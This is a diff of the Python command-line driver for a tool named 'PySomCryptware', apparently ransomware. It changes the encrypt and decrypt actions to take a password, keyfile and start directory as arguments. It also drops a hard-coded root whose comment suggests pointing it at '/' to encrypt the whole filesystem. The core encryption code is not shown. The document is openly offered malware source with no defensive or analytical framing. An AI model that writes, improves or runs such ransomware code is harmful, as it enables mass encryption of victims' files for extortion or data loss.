@@ -13,17 +13,22 @@ from lib import core
 def lets_gerrit():
     args = core.get_cmdline_args()
 
-    lc_root = "."  # change it to suite your needs, maybe sth like '/' :)
     if args["action"] == "encrypt":
-        r = core.PySomCryptware()
-        r.start_crypting(lc_root)
+        r = core.PySomCryptware(password=args["password"],
+                                keyfile=args["keyfile"],
+                                start_path=args["startdir"])
+        r.start_crypting()
     elif args["action"] == "decrypt":
         if args["keyfile"]:
-            r = core.PySomCryptware(keyfile=args["keyfile"])
-            r.start_crypting(lc_root, False)
+            r = core.PySomCryptware(password=args["password"],
+                                    keyfile=args["keyfile"],
+                                    start_path=args["startdir"])
+            r.start_crypting(False)
         else:
-            r = core.PySomCryptware()
-            r.start_crypting(lc_root, False)
+            r = core.PySomCryptware(password=args["password"],
+                                    keyfile=args["keyfile"],
+                                    start_path=args["startdir"])
+            r.start_crypting(False)
 
 
 if __name__ == "__main__":
